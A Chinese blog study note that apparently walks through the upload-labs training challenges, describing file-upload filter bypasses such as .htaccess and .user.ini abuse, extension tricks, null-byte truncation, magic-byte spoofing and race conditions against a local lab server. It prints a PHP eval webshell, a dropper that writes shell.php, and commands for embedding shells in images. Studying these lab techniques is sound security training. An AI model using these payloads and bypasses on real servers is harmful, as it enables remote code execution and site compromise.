src="/../image/upload-pass04-1.png"></p><p>先修改配置文件</p><p>通过源码和提示发现这关基本禁止了一切可以被解析的php文件</p><p><img src="/../image/upload-pass04-2.png"></p><p>但是.htaccess后缀没有被禁止，所以先写一下要上传的.htaccess配置文件</p><p>新建一个配置文件然后输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">AddType application/x-httpd-php .jpg .txt<br><br><br>这个也行<br>&lt;FilesMatch <span class="hljs-string">&#x27;mixbp.jpg&#x27;</span>&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>意思是能够将.jpg和.txt格式文件按php格式解析</p><p><img src="/../image/upload-pass04-3.png"></p><p>然后先上传.htaccess文件再上传jpg格式的php文件（内含一句话木马）</p><p>然后就能用蚁剑连接了</p><h2 id="pass-05-user-ini绕过"><a href="#pass-05-user-ini绕过" class="headerlink" title="pass-05-.user.ini绕过"></a>pass-05-.user.ini绕过</h2><p>前置知识</p><p><img src="/../image/upload-pass05-1.png"></p><p><img src="/../image/upload-pass05-2.png"></p><p><strong>.user.ini文件上传漏洞的前提：</strong></p><p>.user.ini可以生效并且该上传目录有php文件（比如这关后台的readme.php文件）</p><p><code>auto_prepend_file</code> 是 PHP 的一个配置选项，可以用来指定一个文件，在每个 <strong>PHP 脚本执行之前自动包含该文件的内容。这个文件会在 PHP 脚本的头部被包含执行，即在执行脚本之前会先执行这个文件。</strong></p><p>写法：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=mixbp.jpg<br></code></pre></td></tr></table></figure><p>构造mixbp.jpg文件，内含一句话木马，并且输出包含成功方便判断是否包含成功<br><img src="/../image/upload-pass05-3.png"></p><p>auto_prepend file为自动包含文件</p><p>.user.ini文件里写auto_prepend file&#x3D;mixbp.jpg （里面有一句话木马）</p><p><img src="/../image/upload-pass05-5.png"></p><p>然后就是先上传.ini文件，再上传jpg文件</p><p>然后通过访问服务器中的readme.php文件来实现auto_prepend_file功能<br>默认是要等待5分钟才能生效这里修改下配置文件，改成10秒</p><p><img src="/../image/upload-pass05-4.png"></p><p>上传完文件后访问readme.php</p><p><img src="/../image/upload-pass05-6.png"></p><p>包含成功，然后就能用蚁剑连接以下url</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">32.1</span><span class="hljs-regexp">/upload/u</span>pload/readme.php<br></code></pre></td></tr></table></figure><h3 id="点加空格加点绕过"><a href="#点加空格加点绕过" class="headerlink" title="点加空格加点绕过"></a><strong>点加空格加点绕过</strong></h3><p>原理：查看源码发现源码会检验一遍文件名然后先去除末尾的.然后去除一个空格，之后就不会再进行检验了，.php. .去除一个.空格后就变成了.php. ，然后windows系统文件格式末尾的. 会在解析时自动去除，然后就能上传成功了</p><p>就是先上传php文件，然后抓包修改php格式为.php. .</p><p><img src="/../image/upload-pass05-7.png"></p><p><img src="/../image/upload-pass05-8.png"></p><p><img src="/../image/upload-pass05-9.png"></p><p>注意：这里由于末尾的.会自动去除，用蚁剑连接输入url的时候直接省去就行，但是好像不省去也行</p><h2 id="pass-06-大写绕过"><a href="#pass-06-大写绕过" class="headerlink" title="pass-06-大写绕过"></a>pass-06-大写绕过</h2><p>原理：在系统中文件后缀格式会自动解析成小写，所以可以用大写绕过，且这关的源码查看后发现没有将后缀改为小写</p><p>步骤：</p><ol><li>上传mixbp.php</li><li>抓包改写后缀为.Php（随便大写都行）</li><li>上传成功复制图片链接然后蚁剑连接</li></ol><p>这里会出现服务器错误，改成php+nginx就能成功连接了</p><h2 id="pass-07-空格绕过"><a href="#pass-07-空格绕过" class="headerlink" title="pass-07-空格绕过"></a>pass-07-空格绕过</h2><p>原理：在文件格式后加空格，windows系统在解析文件时会自动删掉空格，这关源码没有首尾去空格</p><p>步骤：</p><ol><li>上传mixbp.php</li><li>抓包改写后缀为.php    后面加几个空格</li><li>上传复制图片链接然后蚁剑连接</li></ol><h2 id="pass-08-后缀加点绕过"><a href="#pass-08-后缀加点绕过" class="headerlink" title="pass-08-后缀加点绕过"></a>pass-08-后缀加点绕过</h2><p>在后缀后面加点就完事了，其他和上面一样，原理也是后缀的点会自动去除</p><p>原理：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">strrchr</span><span class="hljs-params">()</span></span> 函数（在php中）查找字符在指定字符串中从右面开始的第一次出现的位置，如果成功，返回该字符以及其后面的字符<br><br>比如mixbp<span class="hljs-selector-class">.php</span>.<br>因为没有去除末尾的点,源码会取到后缀就是最后那个点<br>而单个的.不在黑名单中<br></code></pre></td></tr></table></figure><h2 id="pass-09-DATA绕过"><a href="#pass-09-DATA绕过" class="headerlink" title="pass-09-$DATA绕过"></a>pass-09-$DATA绕过</h2><p>前置知识：额外数据流<br><img src="/../image/upload-pass09-1.png"></p><p>写入方法：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ada">在文件命令行里输入<br><br>echo 内容 &gt;&gt;文件名:额外数据流（可随便命名）<br><br><span class="hljs-keyword">type</span> <span class="hljs-type">文件名1&gt;&gt;文件名2:数据流名 </span>将文件名<span class="hljs-number">1</span>的内容写到文件名<span class="hljs-number">2</span>的额外数据流中<br><br>查看<br>notepad 文件名:额外数据流 用记事本来访问额外数据流<br></code></pre></td></tr></table></figure><p>例如：</p><p><img src="/../image/upload-pass09-2.png"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">这里的<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你好&quot;</span> &gt;&gt;<span class="hljs-number">1</span>.tx<span class="hljs-variable">t:nihao</span>就是将<span class="hljs-string">&quot;你好&quot;</span>写入额外数据流nihao中<br>notepad <span class="hljs-number">1</span>.tx<span class="hljs-variable">t:nihao</span>就是用记事本访问额外数据流<br>注意：直接打开<span class="hljs-number">1</span>.txt是看不到额外数据流的<br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">type</span> <span class="hljs-type">2.txt&gt;&gt;1.txt:study</span><br><span class="hljs-type"></span>将<span class="hljs-number">2</span>.txt的内容写到<span class="hljs-number">1</span>.txt的study额外数据流中<br></code></pre></td></tr></table></figure><p>原理：<strong>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”::$DATA”之前的文件名</strong> <strong>，且windows中的文件后缀不允许有::$DATA出现，所以自动解析后会去除，且这关代码确实少了去除字符串::$DATA</strong></p><p>抓包后修改后缀加上::$DATA</p><p><img src="/../image/upload-pass09-3.png"></p><p>注意：把后面添加的::$DATA删除才能连接成功</p><p><img src="/../image/upload-pass09-4.png"></p><h2 id="pass-10-点空格点绕过"><a href="#pass-10-点空格点绕过" class="headerlink" title="pass-10-点空格点绕过"></a>pass-10-点空格点绕过</h2><p>原理：查看源码发现源码会检验一遍文件名然后先去除末尾的.然后去除一个空格，之后就不会再进行检验了，.php. .去除一个.空格后就变成了.php. ，然后windows系统文件格式末尾的. 会在解析时自动去除，然后就能上传成功了。而后缀经过后端处理后变为了.不再黑名单中也能绕过</p><p>步骤：</p><p>就是先上传php文件，然后抓包修改php后缀，后面加上. .</p><h2 id="pass-11-双写后缀绕过"><a href="#pass-11-双写后缀绕过" class="headerlink" title="pass-11-双写后缀绕过"></a>pass-11-双写后缀绕过</h2><p>查看源码发现多了个函数<br><img src="/../image/upload-pass11-1.png"></p><p>原理：这个函数会从左到右检查$file_name如果其中存在$deny_ext数组中（黑名单）的后缀，会被替换为空值””，但是只替换一次，所以只要将后缀改为.pphphp即可</p><p>步骤：</p><ol><li><p>抓包修改后缀</p><p><img src="/../image/upload-pass11-2.png"></p></li><li><p>蚁剑连接</p></li></ol><h2 id="pass-12-00截断"><a href="#pass-12-00截断" class="headerlink" title="pass-12-%00截断"></a>pass-12-%00截断</h2><p><strong>前置知识：空字符</strong><br>0x00在编程语言中使用</p><p>%00在url编码中使用</p><p>url编码j就是先将ascii码值转为16进制，然后再加%。</p><p>相当于字符串结束标志，后面的内容不会被解析</p><p>原理：这关源码采用白名单，最终文件存放位置使用拼接形式，使用%00截断，<code>需要php版本&lt;5.3.4</code>，并且<code>magic_quotes_gpc</code>关闭。</p><p>存放位置拼接</p><p><img src="/../image/upload-pass12-1.png"></p><p>从源码看出只要修改save_path然后用%00截断后面的路径就能让文件以php格式保存到指定路径</p><p>提交一个mixbp.jpg文件然后抓包，并修改save_path为..&#x2F;upload&#x2F;mixbp.php%00</p><p><img src="/../image/upload-pass12-2.png"></p><p>打开图片链接后发现出现not found错误</p><p><img src="/../image/upload-pass12-3.png"></p><p>这是因为真实的保存路径是截断符号之前的内容所以无法打开，将截断符后面的内容删去即可</p><p><img src="/../image/upload-pass12-4.png"></p><p>连接成功</p><h2 id="psss-13-0x00截断"><a href="#psss-13-0x00截断" class="headerlink" title="psss-13-0x00截断"></a>psss-13-0x00截断</h2><p>这关源码和上关差不多，只是上关是在get传参里修改url编码，这关是改post请求（这关的save_path是通过post请求得到）<br>最终文件存放位置使用拼接形式，所以可以使用0x00截断</p><p>注意：POST不会对里面的数据自动解码，需要在Hex中修改。</p><p>上传mixbp.jpg文件然后抓包后修改</p><p>在..&#x2F;upload&#x2F;后添加mixbp.php空格，加空格是为了后续的hex修改，加其他字符也可以（就是一个占位符方便修改）</p><p><img src="/../image/upload-pass13-1.png"></p><p>添加完之后选中空格然后修改code Hex为00，就是将占位符改为十六进制的00（注意不能直接写0x00）</p><p><img src="/../image/upload-pass13-2.png"></p><p>然后放包上传成功就能复制图片链接用蚁剑连接了，后面的步骤和上关一样</p><h2 id="pass-14-字节标识绕过"><a href="#pass-14-字节标识绕过" class="headerlink" title="pass-14-字节标识绕过"></a>pass-14-字节标识绕过</h2><p>前置知识：图片字节标识<br><img src="/../image/upload-pass14-1.png"></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">字节是计算机中存储和传输数据的基本单位，通常表示为一个八位（<span class="hljs-number">8</span>-bit）的二进制数字序列。<span class="hljs-number">00000000</span><br><br>Utf<span class="hljs-number">-8</span>中，一个英文字符占一个字节，中文（含繁体字）占三个字节<br></code></pre></td></tr></table></figure><p>原理：查看源码发现这题会根据上传文件的前两个字节来判断文件格式，就是先将前两个字节从十六进制转换成十进制然后再白名单中比对。所以我们可以使用字节标识绕过</p><p>源码：</p><p><img src="/../image/upload-pass14-2.png"></p><p>例如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">png</span>头两个字节为<span class="hljs-number">89</span> <span class="hljs-number">50</span>转换为十进制刚好是<span class="hljs-number">137</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>步骤：</p><p>这里我们如果直接将php改成png后缀，上传会不成功，因为源码会对文件的前两个字节验证，所以我们先在一句话木马前加上aa，然后前面就会多出两个61，我们将其改为89 50</p><p><img src="/../image/upload-pass14-3.png"></p><p>这里改完之后就能上传成功了，但是这里不会将我们上传的文件按php解析，用蚁剑会连接失败，所以我们要通过文件包含漏洞来运行，这会让我们上传的文件以php格式被解析</p><p><img src="/../image/upload-pass14-4.png"></p><p>点击文件包含按钮，出现代码，这里用GET传参来接收file文件</p><p><img src="/../image/upload-pass14-5.png"></p><p>在url中加入?file&#x3D;.&#x2F;upload&#x2F;3120250123211252.png，因为这个include.php在我们上传的文件的上级目录所以用.&#x2F;upload&#x2F;</p><p><img src="/../image/../image/upload-pass14-6.png"></p><p>然后就能用蚁剑连接了。</p><p>这关不改前两个字节也行，也能用图片马绕过</p><h2 id="pass-15-图片马绕过"><a href="#pass-15-图片马绕过" class="headerlink" title="pass-15-图片马绕过"></a>pass-15-图片马绕过</h2><p>前置知识：</p><p><img src="/../image/upload-pass15-1.png"></p><p><img src="/../image/upload-pass15-2.png"></p><p>原理：查看源码发现使用了getimagesize()函数和image_type_to_mime_type()函数，先将图像信息取出，然后将取出的图像类型常量值转换为MIME类型，从而验证文件类型。所以这里我们不能用字节标识绕过，但是可以用图片马绕过</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">copy  <span class="hljs-number">111</span>.png/b+<span class="hljs-number">1</span><span class="hljs-selector-class">.php</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.png</span> 将<span class="hljs-number">1</span>.php中的内容拷进<span class="hljs-number">11</span>.png中并重新生成png文件<span class="hljs-selector-tag">a</span><br>注意：这里注意把图片写在前面，将一句话木马写在后面才能解析成功<br></code></pre></td></tr></table></figure><p>在这个命令中，<code>/b</code> 是一个参数，用于指示复制操作的模式。在 Windows 系统中，<code>/b</code> 参数用于指示 <code>copy</code> 命令执行二进制拷贝，即按字节进行拷贝，而不进行任何转换。</p><p>步骤：</p><p>将我们的php一句话木马拷进nailong.jpg中，最后生成出来一个hack.jpg图片里面就含有我们的一句话木马</p><p><img src="/../image/upload-pass15-3.png"></p><p>然后上传hack.jpg之后使用文件包含漏洞即可，步骤和前一关相同</p><h2 id="pass-16-图片马绕过"><a href="#pass-16-图片马绕过" class="headerlink" title="pass-16-图片马绕过"></a>pass-16-图片马绕过</h2><p>和上一关一样，只是源码稍微不一样</p><h2 id="pass-17-二次渲染绕过"><a href="#pass-17-二次渲染绕过" class="headerlink" title="pass-17-二次渲染绕过"></a>pass-17-二次渲染绕过</h2><p>查看源码发现这关检查了content-type和后缀，并且用imagecreatefromjpeg,imagecreatefrompng,imagecreatefromgif函数判断上传的是否为这三种类型的文件，并且使用了二次渲染，导致我们普通的图片马会被渲染，导致失效。</p><p>步骤：</p><p>这关好像只能用gif，因为gif渲染前后文件相同的部分较多，而另外两种类型比gif更脆弱且渲染前后相同区域少，这里上传我们正常的gif图片，上传成功后在浏览器中下载被渲染后的图片，然后使用010editor工具中的tools内的compare file功能比较我们上传之前的图片与渲染后的图片，这里我们就能找到蓝色区域（就是两张图片Hex没有变化的部分），插入我们的一句话木马，<code>&lt;?php @eval($_POST[&#39;mixbp&#39;]);?&gt;</code></p><p><strong>注意：这里插入一句话木马要用粘贴不能自己输入，否则会出问题，并且尽量在匹配区域靠后的位置插入</strong></p><p><img src="/../image/upload-pass17-1.png"></p><p>上传之后使用文件包含漏洞打开</p><p><img src="/../image/upload-pass17-2.png"></p><p>然后就是蚁剑连接，与前面几关一样</p><p>第二种方法：这关也可以先将图片上传然后下载渲染后的文件，然后直接在渲染后的文件内插入一句话木马，因为这里的源码不会对渲染之后的文件再渲染了</p><h2 id="pass-18-条件竞争原理与绕过"><a href="#pass-18-条件竞争原理与绕过" class="headerlink" title="pass-18-条件竞争原理与绕过"></a>pass-18-条件竞争原理与绕过</h2><p>前置知识：条件竞争</p><p>文件上传条件竞争前提：</p><p>服务器会先将任意类型文件放在服务器上，然后再判断合法性，非法则删除</p><p>文件上传条件竞争本质：</p><p>抢夺线程的资源，使得我们上传的生成木马的文件可以被快速访问运行一次，达到非法目的</p><p><img src="/../image/upload-pass18-1.png"></p><p>源码分析：服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名。如果不符合的话，unlink()函数就会删除该文件。</p><p>原理：如果这里有文件包含漏洞的话我们就能用前几关的图片马来绕过，但是这关没有，所以我们只能上传一个能够生成一句话木马的语句然后在这个语句被删除之前访问他（不能直接上传一句话木马访问，会被删除），利用burp多线程发包，然后不断在浏览器访问我们的shell，如果访问成功就会生成一句话木马</p><p><img src="/../image/upload-pass18-2.png"></p><p><img src="/../image/upload-pass18-3.png"></p><p>步骤：</p><p>上传11.php文件，内含<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;mixbp&quot;])?&gt;&#39;);?&gt;</code>，然后抓包</p><p><img src="/../image/upload-pass18-4.png"></p><p>把抓到的包放在intruder中设置攻击，清除payload$，这里选择null payloads然后选择无限重复，并在资源池内，将线程调到30，线程越高越容易访问到</p><p><img src="/../image/upload-pass18-5.png"></p><p>使用requests库构造一个python访问脚本，用来不断访问我们的11.php文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>url = <span class="hljs-string">&quot;http://192.168.32.1/upload/upload/11.php&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    html = requests.<span class="hljs-built_in">get</span>(url)<br>    <span class="hljs-keyword">if</span> html.status_code == 200:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;OK&quot;</span>)<br>        break<br></code></pre></td></tr></table></figure><p>开始攻击并且运行python脚本，看到脚本输出ok，代表访问成功</p><p><img src="/../image/upload-pass18-7.png"></p><p>然后就能用蚁剑去连接我们的shell.php了，连接成功</p><p><img src="/../image/upload-pass18-8.png"></p><p>这里不使用python脚本也行，我们访问<a href="http://192.168.32.1/upload/upload/11.php%E8%B7%AF%E5%BE%84%E7%84%B6%E5%90%8E%E6%8A%93%E5%8F%96%E8%AE%BF%E9%97%AE%E5%8C%85%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%86%E8%AE%BF%E9%97%AE%E5%8C%85%E8%AE%BE%E7%BD%AE%E6%94%BB%E5%87%BB%EF%BC%8C%E4%B9%9F%E6%98%AF%E9%80%89%E6%8B%A9null">http://192.168.32.1/upload/upload/11.php路径然后抓取访问包，然后将访问包设置攻击，也是选择null</a> payloads然后选择无限重复，调高线程成功访问概率会更大。然后就是先开启上传攻击，然后再访问攻击即可</p><h2 id="pass-19-apache解析漏洞-条件竞争"><a href="#pass-19-apache解析漏洞-条件竞争" class="headerlink" title="pass-19-apache解析漏洞+条件竞争"></a>pass-19-apache解析漏洞+条件竞争</h2><p>我们上传php文件，然后抓包改格式，源码会将我们的文件重命名为我们改的那个格式，又因为没有文件包含漏洞，不能将其以php格式解析，并且这里会先检查后缀，所以php文件还没有到服务器就被删掉了，所以这里不能用普通的条件竞争，要使用apache解析漏洞+条件竞争。</p><p>原理：apache不能解析.7z后缀名的文件，所以我们将11.php改为11.php.7z，这时apache会将其解析为11.php，从而实现绕过，然后这里我们的文件被转移到服务器后会被重命名，所以我们不断上传一个能生成一句话木马文件的小马，在被删除之前不断访问，即可得到shell</p><p>步骤：</p><p>将11.php文件上传然后抓包（内含<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["mixbp"])?>‘);?&gt;），然后修改后缀为11.php.7z</p><p><img src="/../image/upload-pass19-1.png"></p><p>然后就是不断的上传和访问（<a href="http://xxx.xxx.xxx.xx.1/upload/upload/11.php.7z）攻击，和上一关一样，后续步骤也一样。">http://xxx.xxx.xxx.xx.1/upload/upload/11.php.7z）攻击，和上一关一样，后续步骤也一样。</a></p><p><strong>注意：这关中，要实现多后缀解析漏洞需要在配置文件中修改配置 AddHandler application&#x2F;x-httpd-php .php</strong><br><strong>还有就是我这关不知道为什么重命名前我的文件变成了upload11.php.7z</strong></p><h2 id="pass-20-后缀绕过总结"><a href="#pass-20-后缀绕过总结" class="headerlink" title="pass-20-后缀绕过总结"></a>pass-20-后缀绕过总结</h2><p>源码分析：这关会将保存名称最后一个点之后的内容当做后缀名并验证，所以前面的所有后缀绕过都行，相当于前面后缀绕过的总结</p><p><img src="/../image/upload-pass20-1.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">这里各种后缀绕过都行<br>比如：<br>点绕过upload-<span class="hljs-number">19</span><span class="hljs-selector-class">.php</span>.<br>点空格绕过upload-<span class="hljs-number">19</span><span class="hljs-selector-class">.php</span>.空格<br>点空格点绕过upload-<span class="hljs-number">19</span><span class="hljs-selector-class">.php</span>. .<br>反斜杠upload-<span class="hljs-number">19</span>.php\.因为move_uploaded_file函数在move的时候会把\忽略掉<br>抓包后<span class="hljs-number">0</span>x00截断绕过upload-<span class="hljs-number">19</span><span class="hljs-selector-class">.php0x00</span><span class="hljs-selector-class">.jpg</span>因为windows读到<span class="hljs-number">0</span>x00就会被截断<br>抓包后<span class="hljs-variable">$DATA</span>绕过upload-<span class="hljs-number">19</span><span class="hljs-selector-class">.php</span>::<span class="hljs-variable">$DATA</span><br></code></pre></td></tr></table></figure><h2 id="pass-21-审计-数组后缀绕过"><a href="#pass-21-审计-数组后缀绕过" class="headerlink" title="pass-21-审计+数组后缀绕过"></a>pass-21-审计+数组后缀绕过</h2><p>代码审计</p><p><img src="/../image/upload-pass21-1.png"></p><p>验证步骤</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-number">1.</span>验证content-type是否为image/jpeg||image/png||image/gif<br><span class="hljs-number">2.</span>判断用POST发送的保存名称是否为空，如果为空<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>就用文件原名称，不为空就<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>就用保存名称<br><span class="hljs-number">3.</span>判断<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>是否为数组，如果不为数组就用explode()函数对<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>以<span class="hljs-string">&#x27;.&#x27;</span>来进行分割，使其变成数组<br><span class="hljs-number">4.</span>用end()函数取出<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>数组的最后一个元素，然后判断该后缀是否合法<br><span class="hljs-number">5.</span>用reset()函数取出数组第一位，然后与<span class="hljs-string">&#x27;.&#x27;</span>和<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>[count(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>) - <span class="hljs-number">1</span>]进行拼接来生成保存文件名<span class="hljs-symbol">$</span>flie_name<br><span class="hljs-number">6.</span>使用move_uploaded_file()函数来将文件从临时目录转移到目标路径<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">explode</span><span class="hljs-params">(separator,string[,limit])</span></span> 函数，使用一个字符串分割另一个字符串，并返回由字符串组成的数组。<br><span class="hljs-function"><span class="hljs-title">end</span><span class="hljs-params">(array)</span></span>函数，输出数组中的当前元素和最后一个元素的值。<br><span class="hljs-function"><span class="hljs-title">reset</span><span class="hljs-params">(array)</span></span>函数，把数组的内部指针指向第一个元素，并返回这个元素的值<br><span class="hljs-function"><span class="hljs-title">count</span><span class="hljs-params">(array)</span></span>函数，计算数组中的单元数目，或对象中的属性个数<br></code></pre></td></tr></table></figure><p>原理：由于这里会将我们上传的保存名称分割为数组，但是我们直接发送数组，就可以绕过explode()，然后最后会将数组的第一位和第count($file)-1位进行拼接，所以我们只要保证数组第一位是1.php，然后第count($file-1)位为null即可拼接为1.php.在windows系统里会被自动删去后面的. 最后变为1.php，完成绕过</p><p>步骤：</p><p>上传我们的11.php（内含一句话木马）然后抓包，修改content-type为image&#x2F;jpeg||image&#x2F;png||image&#x2F;gif</p><p><img src="/../image/upload-pass21-2.png"></p><p>然后修改我们的POST的参数为save_name[0]，然后将save_name[0]的值改为1.php，然后复制POST请求，粘贴到下面改为save_name[2]，值改为jpg||png||gif，这样就会使$file[count($file)-1]&#x3D;$file[2-1]&#x3D;$file[1]&#x3D;null</p><p><img src="/../image/upload-pass21-3.png"></p><p>上传成功</p><p><img src="/../image/upload-pass21-4.png"></p><p>然后用蚁剑连接我们的一句话木马即可</p><h2 id="文件幻术头"><a href="#文件幻术头" class="headerlink" title="文件幻术头"></a>文件幻术头</h2><p>什么是文件幻术头<br>文件幻术头（也称为文件头、文件标识或魔术头）是文件的二进制数据中的一段特定字节序列，用于标识文件的类型或格式。它在文件的开头位置，并且通常是固定长度的。</p><h3 id="文件幻术头的主要作用"><a href="#文件幻术头的主要作用" class="headerlink" title="文件幻术头的主要作用"></a><strong>文件幻术头的主要作用</strong></h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">1.文件类型识别：文件幻术头可以帮助程序或操作系统识别文件的类型。通过读取文件幻术头的特定字节序列，可以确定文件的实际类型，例如图片文件、音频文件、视频文件等。这对于文件处理软件和操作系统来说非常重要，因为它们需要根据文件的类型采取不同的处理方式。<br>2.文件完整性验证：文件幻术头还可以用于验证文件的完整性。某些文件格式的幻术头包含了文件的校验和或哈希值，可以用于检测文件是否被篡改或损坏。例如，压缩文件格式如ZIP和GZIP在文件头中包含了校验和，可以用于验证文件的完整性。<br>3.文件类型扩展名关联：文件幻术头通常与文件的扩展名（例如<span class="hljs-string">.jpg</span>、<span class="hljs-string">.png</span>、<span class="hljs-string">.bmp</span>等）关联。文件的扩展名通常用于表示文件类型，但它们可以被篡改或者不准确，而文件幻术头提供了一种更可靠的方式来确定文件的实际类型。这对于操作系统和文件管理工具来说非常重要，可以确保文件被正确地关联到相应的应用程序进行打开或处理。<br>4.绕过文件类型检查：某些服务器端对文件类型的检查可能仅仅是检查文件的扩展名而不是文件的内容。你可以尝试修改木马文件的内容，使其符合服务器端允许的文件类型的文件格式。例如，你可以通过在文件开头添加合法的文件头（如GIF的文件头）来绕过文件类型检查。<br></code></pre></td></tr></table></figure><h3 id="常见的图片文件格式文件幻术头"><a href="#常见的图片文件格式文件幻术头" class="headerlink" title="常见的图片文件格式文件幻术头"></a><strong>常见的图片文件格式文件幻术头</strong></h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">JPEG</span>文件（.jpg或.jpeg）的幻术头：FF D8 FF<br><span class="hljs-attribute">PNG</span>文件（.png）的幻术头：<span class="hljs-number">89</span> <span class="hljs-number">50</span> <span class="hljs-number">4</span>E <span class="hljs-number">47</span> <span class="hljs-number">0</span>D <span class="hljs-number">0</span>A <span class="hljs-number">1</span>A <span class="hljs-number">0</span>A<br><span class="hljs-attribute">GIF</span>文件（.gif）的幻术头：<span class="hljs-number">47</span> <span class="hljs-number">49</span> <span class="hljs-number">46</span> <span class="hljs-number">38</span> <span class="hljs-number">39</span> <span class="hljs-number">61</span> 或 <span class="hljs-number">47</span> <span class="hljs-number">49</span> <span class="hljs-number">46</span> <span class="hljs-number">38</span> <span class="hljs-number">37</span> <span class="hljs-number">61</span><br><span class="hljs-attribute">BMP</span>文件（.bmp）的幻术头：<span class="hljs-number">42</span> <span class="hljs-number">4</span>D<br><span class="hljs-attribute">TIFF</span>文件（.tif或.tiff）的幻术头：<span class="hljs-number">4</span>D <span class="hljs-number">4</span>D <span class="hljs-number">00</span> <span class="hljs-number">2</span>A 或 <span class="hljs-number">49</span> <span class="hljs-number">49</span> <span class="hljs-number">2</span>A <span class="hljs-number">00</span><br><span class="hljs-attribute">ICO</span>文件（.ico）的幻术头：<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">WebP</span>文件（.webp）的幻术头：<span class="hljs-number">52</span> <span class="hljs-number">49</span> <span class="hljs-number">46</span> <span class="hljs-number">46</span> xx xx xx xx <span class="hljs-number">57</span> <span class="hljs-number">45</span> <span class="hljs-number">42</span> <span class="hljs-number">50</span>，其中 xx 是文件大小的字节序列<br></code></pre></td></tr></table></figure><p>注意这里的16进制文件幻术头是字符经过前端编码后得到的，例如GIF的47 49 46 38 39  61经过16进制转换为字符后就是GIF89a,而这个GIF89a可以直接放到木马脚本的前面，因为上传的时候前端回将其编码为47 49 46 38 39  61（这里再burp抓到的包可以看到hex）。而其他几种文件的幻术头解码为字符串放到木马脚本前面再传的时候还是不行（因为解码出来有些不是机器码所以复制的时候回乱码）这里可以直接去burp里面改16进制包（在不破坏包的情况下改木马前面的十六进制）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
